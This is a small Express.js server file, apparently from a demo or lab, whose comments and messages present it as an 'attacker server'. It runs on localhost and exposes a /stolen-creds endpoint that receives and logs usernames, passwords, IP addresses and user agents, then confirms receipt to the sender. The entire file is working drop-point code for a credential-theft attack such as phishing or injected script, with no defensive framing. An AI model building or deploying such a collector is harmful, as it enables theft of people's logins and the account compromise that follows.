const express = require('express');
const cors = require('cors');

const app = express();
const PORT = 3001;

app.use(cors());
app.use(express.json());

// Endpoint to capture stolen credentials
app.post('/stolen-creds', (req, res) => {
  const { username, password } = req.body;
  
  console.log('Username:', username);
  console.log('Password:', password);
  console.log('Timestamp:', new Date().toISOString());
  console.log('IP Address:', req.ip);
  console.log('Info:', req.get('user-agent'));
  
  res.json({
    success: true,
    message: 'Credentials received by attacker server'
  });
});

app.listen(PORT, () => {
  console.log(`Attacker server running on http://localhost:${PORT}`);
});
